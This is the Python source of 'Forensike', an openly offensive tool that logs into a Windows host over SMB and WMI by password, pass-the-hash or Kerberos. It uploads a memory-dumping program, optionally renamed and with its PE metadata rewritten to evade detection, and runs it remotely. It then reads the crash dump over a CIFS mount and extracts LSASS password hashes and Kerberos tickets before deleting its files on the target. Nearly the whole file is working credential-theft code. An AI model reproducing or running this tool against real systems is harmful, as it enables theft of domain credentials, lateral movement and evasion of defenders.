#!/usr/bin/env python3
"""Forensike — Offensive Forensics (Python / Linux edition)

Linux-compatible port.  Same philosophy as the PowerShell original:
  1. DumpIt crash dump on target         (stealth, EDR-friendly)
  2. Debug the crash dump **remotely**    (never downloaded)
  3. Extract LSASS credentials + tickets  (from the crash dump)

Remote ops   : impacket  (WMI + SMB — password, PTH, Kerberos auth)
Crash access : CIFS mount (Linux equivalent of \\\\target\\C$ UNC)
Extraction   : volatility3 parses the crash dump, finds LSASS memory,
               lsass_extract.py builds a valid minidump from it,
               pypykatz extracts credentials + Kerberos tickets.
               This is Forensike's own "mimilib for Linux".
Metadata     : pefile for PE obfuscation on Linux (replaces rcedit)
"""

import argparse
import os
import random
import re
import shutil
import socket
import string
import subprocess
import sys
import textwrap
import time
from datetime import datetime
from pathlib import Path

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi as wmilib
    from impacket.dcerpc.v5.dtypes import NULL
except ImportError:
    sys.exit("[!] impacket is required: pip install forensike")

from .lsass_extract import extract_from_crashdump


# ── Terminal helpers ──────────────────────────────────────────────────

G   = "\033[92m"
R   = "\033[91m"
W   = "\033[97m"
DIM = "\033[2m"
BGr = "\033[41m"
RST = "\033[0m"

def info(msg):    print(f"[*] {msg}")
def good(msg):    print(f"{G}[+] {msg}{RST}")
def warn(msg):    print(f"{R}[!] {msg}{RST}")
def header(msg):
    print(f"\n{'=' * 65}")
    print(f"{W}{BGr}>>>>>>>>>>[ {msg} ]<<<<<<<<<< {RST}")
    print(f"{'=' * 65}\n")

BANNER = r"""
███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║██║ ██╔╝██╔════╝
█████╗  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗██║█████╔╝ █████╗
██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║╚════██║██║██╔═██╗ ██╔══╝
██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║███████║██║██║  ██╗███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═╝╚══════╝
                    Offensive Forensics — Python / Linux Edition
"""


# ══════════════════════════════════════════════════════════════════════
class Forensike:

    REMOTE_DIR = "Windows\\Temp\\Forensike"
    DUMP_NAME  = "Forensike.dmp"

    # ── init ──────────────────────────────────────────────────────────

    def __init__(self, args):
        self.target     = args.target
        self.tools_dir  = Path(args.tools_dir).resolve()
        self.dump_dir   = Path(args.dump_dir).resolve()
        self.domain     = args.domain or "."
        self.username   = args.username or ""
        self.password   = args.password or ""
        self.hashes     = args.hashes or ""
        self.use_kerb   = args.auth_kerberos
        self.do_meta    = args.metadata
        self.do_kerb    = args.kerberos
        self.dump_file  = args.dump_file

        self.lmhash, self.nthash = "", ""
        if self.hashes:
            parts = self.hashes.split(":")
            self.lmhash = parts[0]
            self.nthash = parts[1] if len(parts) > 1 else ""

        self.smb          = None
        self.dcom         = None
        self.wmi          = None
        self.target_ip    = None
        self.target_name  = None
        self.proc_name    = "DumpIt.exe"
        self.start_time   = None
        self.mount_point  = None
        self._mounted     = False

    # ── connection ────────────────────────────────────────────────────

    def connect(self):
        info(f"Resolving {self.target} ...")
        self.target_ip = socket.gethostbyname(self.target)
        good(f"Target IP: {self.target_ip}")

        info("Connecting via SMB ...")
        self.smb = SMBConnection(self.target, self.target_ip, timeout=30)
        if self.use_kerb:
            self.smb.kerberosLogin(self.username, self.password, self.domain)
        else:
            self.smb.login(self.username, self.password, self.domain,
                           self.lmhash, self.nthash)
        good("SMB session established")

        info("Connecting via WMI (DCOM) ...")
        self.dcom = DCOMConnection(
            self.target_ip, self.username, self.password,
            self.domain, self.lmhash, self.nthash,
            doKerberos=self.use_kerb, oxidResolver=True,
        )
        iface = self.dcom.CoCreateInstanceEx(
            wmilib.CLSID_WbemLevel1Login,
            wmilib.IID_IWbemLevel1Login,
        )
        login = wmilib.IWbemLevel1Login(iface)
        self.wmi = login.NTLMLogin("//./root/cimv2", NULL, NULL)
        login.RemRelease()
        good("WMI session established")

    def disconnect(self):
        self._unmount()
        try:
            if self.dcom:
                self.dcom.disconnect()
        except Exception:
            pass
        try:
            if self.smb:
                self.smb.close()
        except Exception:
            pass

    # ── WMI helpers ───────────────────────────────────────────────────

    def _wql(self, query):
        try:
            enum = self.wmi.ExecQuery(query)
        except Exception as exc:
            warn(f"WMI query error: {exc}")
            return []
        rows = []
        while True:
            try:
                obj   = enum.Next(0xffffffff, 1)[0]
                props = obj.getProperties()
                rows.append({k: props[k]["value"] for k in props})
            except Exception:
                break
        return rows

    def _wmi_exec(self, cmdline):
        proc, _ = self.wmi.GetObject("Win32_Process")
        proc.Create(cmdline, "C:\\", None)

    def _process_alive(self, name):
        rows = self._wql(
            f"SELECT ProcessId FROM Win32_Process WHERE Name='{name}'"
        )
        return any(r.get("ProcessId") for r in rows)

    # ── SMB helpers ───────────────────────────────────────────────────

    def _upload(self, local_path, remote_rel):
        with open(local_path, "rb") as fh:
            self.smb.putFile("C$", remote_rel, fh.read)

    def _mkdir(self, remote_rel):
        try:
            self.smb.createDirectory("C$", remote_rel)
        except Exception:
            pass

    def _rmtree(self, remote_rel):
        try:
            entries = self.smb.listPath("C$", remote_rel + "\\*")
        except Exception:
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            child = f"{remote_rel}\\{name}"
            if entry.is_directory():
                self._rmtree(child)
            else:
                try:
                    self.smb.deleteFile("C$", child)
                except Exception:
                    pass
        try:
            self.smb.deleteDirectory("C$", remote_rel)
        except Exception:
            pass

    # ── CIFS mount (Linux UNC equivalent) ─────────────────────────────

    def _mount(self):
        """Mount //target/C$ via CIFS — Linux equivalent of UNC access."""
        self.mount_point = Path(f"/tmp/forensike_{self.target}_{os.getpid()}")
        self.mount_point.mkdir(parents=True, exist_ok=True)

        opts = f"username={self.username},domain={self.domain},soft,noperm"
        if self.password:
            opts += f",password={self.password}"
        elif self.nthash:
            opts += f",pass={self.nthash},sec=ntlmv2"
        else:
            opts += ",guest"

        info(f"Mounting //{self.target}/C$ → {self.mount_point}")
        result = subprocess.run(
            ["mount", "-t", "cifs", f"//{self.target}/C$",
             str(self.mount_point), "-o", opts],
            capture_output=True, text=True,
        )
        if result.returncode != 0:
            info("Retrying with sudo ...")
            result = subprocess.run(
                ["sudo", "mount", "-t", "cifs", f"//{self.target}/C$",
                 str(self.mount_point), "-o", opts],
                capture_output=True, text=True,
            )

        if result.returncode != 0:
            warn(f"CIFS mount failed: {result.stderr.strip()}")
            warn("Options:")
            warn(f"  1. Mount manually:  sudo mount -t cifs //{self.target}/C$ /mnt/target -o {opts}")
            warn( "     then rerun with: --dump-file /mnt/target/Windows/Temp/Forensike/Forensike.dmp")
            warn( "  2. Install:         sudo apt install cifs-utils")
            self.mount_point.rmdir()
            self.mount_point = None
            return False

        self._mounted = True
        good(f"CIFS mount OK → {self.mount_point}")
        return True

    def _unmount(self):
        if self._mounted and self.mount_point:
            info("Unmounting CIFS share ...")
            subprocess.run(["umount", str(self.mount_point)],
                           capture_output=True)
            try:
                self.mount_point.rmdir()
            except Exception:
                pass
            self._mounted = False

    # ── recon ─────────────────────────────────────────────────────────

    def recon(self):
        r  = self._wql("SELECT Name, TotalPhysicalMemory, UserName "
                        "FROM Win32_ComputerSystem")
        cs = r[0] if r else {}
        self.target_name = cs.get("Name", "?")
        ram_bytes = int(cs.get("TotalPhysicalMemory") or 0)
        ram_gb    = round(ram_bytes / (1024 ** 3), 2)
        user      = cs.get("UserName") or "NONE"

        r   = self._wql("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration "
                         "WHERE IPEnabled=TRUE")
        ips = []
        for row in r:
            addrs = row.get("IPAddress") or []
            if isinstance(addrs, str):
                addrs = [addrs]
            ips.extend(a for a in addrs if ":" not in a)

        r  = self._wql("SELECT Caption FROM Win32_TimeZone")
        tz = r[0].get("Caption", "?") if r else "?"

        r     = self._wql("SELECT DeviceID, FreeSpace FROM Win32_LogicalDisk "
                           "WHERE DriveType=3")
        disks = sorted(
            [(row.get("DeviceID", "?"),
              round(int(row.get("FreeSpace") or 0) / (1024 ** 3), 2))
             for row in r],
            key=lambda d: -d[1],
        )

        print("=" * 65)
        print(f"  {W}Target      : {self.target_name} — {', '.join(ips)}{RST}")
        print(f"  {W}RAM         : {ram_gb} GB{RST}")
        print(f"  {W}Timezone    : {tz}{RST}")
        print(f"  {W}Logged user : {user}{RST}")
        print(f"  {W}Est. dump   : ~{ram_gb} GB{RST}")
        if disks:
            print(f"  {W}Best disk   : {disks[0][0]}  ({disks[0][1]} GB free){RST}")
        print("=" * 65)

        ans = input("\n[?] Proceed? (Y/n) ").strip().lower()
        if ans not in ("", "y", "yes"):
            warn("Cancelled.")
            sys.exit(0)

    # ── prerequisites ─────────────────────────────────────────────────

    def check_tools(self):
        self.vol_cmd      = shutil.which("vol") or shutil.which("vol3")
        self.pypykatz_cmd = shutil.which("pypykatz")

        if not self.vol_cmd:
            warn("volatility3 not found — required to parse crash dumps")
            warn("  pip install volatility3")
            sys.exit(1)
        good(f"volatility3 found: {self.vol_cmd}")

        if not self.pypykatz_cmd:
            warn("pypykatz not found — required to extract credentials from LSASS minidump")
            warn("  pip install pypykatz")
            sys.exit(1)
        good(f"pypykatz found: {self.pypykatz_cmd}")

        if not self.dump_file:
            if not (self.tools_dir / "DumpIt.exe").exists():
                warn(f"DumpIt.exe not found in {self.tools_dir}")
                sys.exit(1)
            good("DumpIt.exe found")

    # ── PE metadata obfuscation ───────────────────────────────────────

    def _obfuscate_pe(self, src: Path, dst: Path, fake_name: str):
        shutil.copy2(src, dst)
        try:
            import pefile
            pe = pefile.PE(str(dst))
            if hasattr(pe, "FileInfo"):
                for fi_list in pe.FileInfo:
                    for entry in fi_list:
                        if hasattr(entry, "StringTable"):
                            for st in entry.StringTable:
                                for key in list(st.entries.keys()):
                                    st.entries[key] = fake_name.encode("utf-16-le")
            pe.write(str(dst))
            pe.close()
            good(f"Metadata obfuscated via pefile → {dst.name}")
        except ImportError:
            warn("pefile not installed — uploading renamed copy without metadata changes")
        except Exception as exc:
            warn(f"pefile failed ({exc}) — uploading renamed copy")

    # ── remote setup ──────────────────────────────────────────────────

    def setup_remote(self):
        info("Creating remote working directory ...")
        self._mkdir(self.REMOTE_DIR)

        src = self.tools_dir / "DumpIt.exe"

        if self.do_meta:
            rand     = "".join(random.choices(string.ascii_letters, k=8))
            rand_exe = f"{rand}.exe"
            tmp      = self.dump_dir / rand_exe
            self._obfuscate_pe(src, tmp, rand)
            info(f"Uploading {rand_exe} ...")
            self._upload(str(tmp), f"{self.REMOTE_DIR}\\{rand_exe}")
            self.proc_name = rand_exe
            tmp.unlink(missing_ok=True)
        else:
            info("Uploading DumpIt.exe ...")
            self._upload(str(src), f"{self.REMOTE_DIR}\\DumpIt.exe")

        good("Tools staged on target")

    # ── crash dump acquisition ────────────────────────────────────────

    def acquire_dump(self):
        header("STARTING CRASH DUMP ACQUISITION")
        self.start_time = datetime.now()
        info(f"Start: {self.start_time:%H:%M:%S}")

        remote_dir = f"C:\\{self.REMOTE_DIR}"
        dump_path  = f"{remote_dir}\\{self.DUMP_NAME}"
        cmd = (f"powershell /c {remote_dir}\\{self.proc_name} "
               f"/OUTPUT {dump_path} /QUIET")

        self._wmi_exec(cmd)
        time.sleep(10)

        while self._process_alive(self.proc_name):
            info("Dumping target memory ...")
            time.sleep(60)

        good("Crash dump acquisition complete")

    # ── access crash dump remotely ────────────────────────────────────

    def get_dump_path(self) -> Path:
        """Return a local path to the crash dump (via mount or user-supplied)."""
        if self.dump_file:
            p = Path(self.dump_file)
            if not p.exists():
                warn(f"Dump file not found: {p}")
                sys.exit(1)
            good(f"Using existing dump: {p}")
            return p

        if not self._mount():
            warn("Cannot access crash dump — aborting extraction")
            sys.exit(1)

        p = self.mount_point / "Windows" / "Temp" / "Forensike" / self.DUMP_NAME
        if not p.exists():
            warn(f"Crash dump not found at {p}")
            sys.exit(1)

        good(f"Crash dump accessible at {p}")
        good(f"  ({p.stat().st_size / (1024**3):.2f} GB — read remotely, NOT downloaded)")
        return p

    # ── credential extraction ─────────────────────────────────────────

    def extract_credentials(self, dump_path: Path):
        """Extract creds from crash dump via vol3 → minidump → pypykatz."""
        header("CREDENTIAL EXTRACTION FROM CRASH DUMP")

        kirbi_dir = str(self.dump_dir / "kirbi") if self.do_kerb else None

        text, n_kirbi = extract_from_crashdump(
            dump_path     = str(dump_path),
            output_dir    = str(self.dump_dir),
            vol_cmd       = self.vol_cmd,
            pypykatz_cmd  = self.pypykatz_cmd,
            kerberos_dir  = kirbi_dir,
        )

        if not text:
            warn("Credential extraction failed")
            return

        results_file = self.dump_dir / "forensike_results.txt"
        with open(results_file, "w", encoding="utf-8") as fh:
            fh.write(text)

        interesting = re.compile(
            r"(username|domainname|NT|Password|sha1|lm)\s*:", re.I
        )
        seen = set()
        for line in text.splitlines():
            s = line.strip()
            if interesting.search(s) and s not in seen:
                print(f"  {s}")
                seen.add(s)

        good(f"Full results → {results_file}")
        if n_kirbi:
            good(f"{n_kirbi} Kerberos ticket(s) exported → {kirbi_dir}")

    # ── cleanup ───────────────────────────────────────────────────────

    def cleanup(self):
        """Delete remote Forensike directory (tools + crash dump)."""
        info("Cleaning up remote directory ...")
        self._rmtree(self.REMOTE_DIR)
        good("Remote cleanup done")

        end = datetime.now()
        dur = end - (self.start_time or end)
        info(f"End: {end:%H:%M:%S}  —  Duration: {dur}")

    # ── main flow ─────────────────────────────────────────────────────

    def run(self):
        print(BANNER)
        print("=" * 65)
        print(f"  {W}Requires admin privileges on target{RST}")
        print("=" * 65)
        self.dump_dir.mkdir(parents=True, exist_ok=True)
        self.start_time = datetime.now()

        try:
            self.check_tools()
            self.connect()

            if not self.dump_file:
                self.recon()
                self.setup_remote()
                self.acquire_dump()

            dump_path = self.get_dump_path()
            self.extract_credentials(dump_path)

            if not self.dump_file:
                self.cleanup()

        except KeyboardInterrupt:
            warn("\nInterrupted")
        except Exception as exc:
            warn(str(exc))
            import traceback
            traceback.print_exc()
        finally:
            self.disconnect()

        print(f"\n{'=' * 65}")
        rf = self.dump_dir / "forensike_results.txt"
        if rf.exists():
            good(f"Hashes  → {rf}")
        if self.do_kerb:
            kd = self.dump_dir / "kirbi"
            if kd.exists():
                good(f"Tickets → {kd}")
        print("=" * 65)


# ══════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(
        description="Forensike — offensive forensics via crash-dump acquisition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Authentication (pick one):
              Password :  -d CORP -u admin -p 'P@ssw0rd'
              PTH      :  -d CORP -u admin -H aad3b435b51404ee:nthash
              Kerberos :  -d CORP -u admin -K   (uses $KRB5CCNAME)

            Examples:
              # Full attack — DumpIt + remote extraction from Linux
              %(prog)s WS01 --tools-dir ./tools --dump-dir ./out -d CORP -u admin -p Passw0rd

              # With Kerberos ticket export
              %(prog)s WS01 --tools-dir ./tools --dump-dir ./out -d CORP -u admin -p Passw0rd --kerberos

              # Reuse a dump from a previous run (or manual mount)
              %(prog)s WS01 --tools-dir ./tools --dump-dir ./out -d CORP -u admin -p Passw0rd \\
                  --dump-file /mnt/target/Windows/Temp/Forensike/Forensike.dmp

              # With PE metadata obfuscation (pefile on Linux)
              %(prog)s WS01 --tools-dir ./tools --dump-dir ./out -d CORP -u admin -H :nthash --metadata
        """),
    )

    p.add_argument("target", help="Target hostname (NetBIOS name)")
    p.add_argument("--tools-dir", required=True,
                   help="Folder with DumpIt.exe")
    p.add_argument("--dump-dir", required=True,
                   help="Local output folder for results")

    auth = p.add_argument_group("authentication")
    auth.add_argument("-d", "--domain",   default=".", help="Domain (default: .)")
    auth.add_argument("-u", "--username", default="",  help="Username")
    auth.add_argument("-p", "--password", default="",  help="Cleartext password")
    auth.add_argument("-H", "--hashes",   default="",  metavar="LM:NT",
                      help="NTLM hash for pass-the-hash")
    auth.add_argument("-K", "--auth-kerberos", action="store_true",
                      help="Kerberos auth via $KRB5CCNAME ccache")

    opts = p.add_argument_group("options")
    opts.add_argument("--metadata", action="store_true",
                      help="Rename DumpIt and strip PE metadata before upload")
    opts.add_argument("--kerberos", action="store_true",
                      help="Export Kerberos tickets as .kirbi files")
    opts.add_argument("--dump-file", default=None, metavar="PATH",
                      help="Path to an existing crash dump (skip acquisition, "
                           "e.g. from a manual CIFS mount or previous run)")

    args = p.parse_args()
    Forensike(args).run()


if __name__ == "__main__":
    main()
